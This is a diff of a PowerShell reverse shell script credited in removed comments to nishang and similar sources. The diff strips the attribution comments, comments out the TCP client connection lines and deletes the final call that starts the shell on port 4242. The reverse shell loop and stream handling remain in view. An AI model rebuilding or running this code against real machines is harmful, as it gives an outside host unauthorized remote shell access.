@@ -1,6 +1,3 @@
-# Origional rev shell script from: https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1
-# Slight modifications to remove hard coding of IP Address but overall a gas rev shell script
-
 [CmdletBinding()]
 [Parameter()]
 [string]$SampleAddress = "172.16.128.1",
@@ -17,11 +14,6 @@ foreach ($ip in $IPs){
 }
 
 
-# Function from:
-# http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
-# https://github.com/nettitude/powershell/blob/master/powerfun.ps1
-# https://github.com/samratashok/nishang
-
 function Invoke-PowerShellTcp {      
     [CmdletBinding()] 
     Param(
@@ -33,8 +25,8 @@ function Invoke-PowerShellTcp {
     )
     While($true){
         foreach ($ip in $IPs) {
-            $client = New-Object System.Net.Sockets.TcpClient
-            $connectionAttempt = $client.ConnectAsync($ip, $Port).Wait(1000)
+            #$client = New-Object System.Net.Sockets.TcpClient
+            #$connectionAttempt = $client.ConnectAsync($ip, $Port).Wait(1000)
             if ($connectionAttempt -eq $true) {
                 try {
                     $stream = $client.GetStream()
@@ -79,6 +71,3 @@ function Invoke-PowerShellTcp {
         }
     }
 }
-
-
-Invoke-PowerShellTcp -Port 4242 -IPs $usableIPs
